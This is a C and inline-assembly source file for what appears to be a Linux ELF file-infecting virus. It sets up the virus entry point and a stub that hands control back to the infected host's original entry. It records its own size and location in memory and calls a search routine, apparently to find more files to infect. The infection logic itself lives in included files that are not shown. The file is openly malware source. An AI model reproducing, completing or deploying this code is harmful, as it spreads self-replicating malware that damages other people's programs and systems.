#include <unistd.h>
#include <linux/types.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <elf.h>

#include "../Loader/loader.h"

typedef struct {
	int size;
	void *self;
	/* loader */
	uint8_t *loader;
} globals;
register globals *g asm("ebp");
extern void virus_start;
static void virus_end(void);

asm(	".globl fake_host; fake_host: mov $1, %eax; xorl %ebx,%ebx; int $0x80");
asm(	".globl virus_start; virus_start:\n"
	"call virus; add $24,%esp; popa; .byte 0x68; old_entry: .long fake_host; ret");

#include "../h/syscalls.h"
#include "../h/infect.h"
#include "../h/strings.c"

INFECT_INIT
#include "infect-remove.c"
INFECT_FINI

#include "../h/search.c"

void virus(uint32_t esp)
{
	/* determine our own size and location in memory, init globals */
	globals glob;
	g = &glob;
	g->size = (uint32_t)&virus_end - (uint32_t)&virus_start;
	g->self = (void*)__builtin_return_address(0) - 5;

	/* loader */
	uint8_t loader[CSIZE];
#include "../Loader/loader1.c"
	g->loader = loader;

	/* do our job */
	search(NULL);
}

static void virus_end(void){};
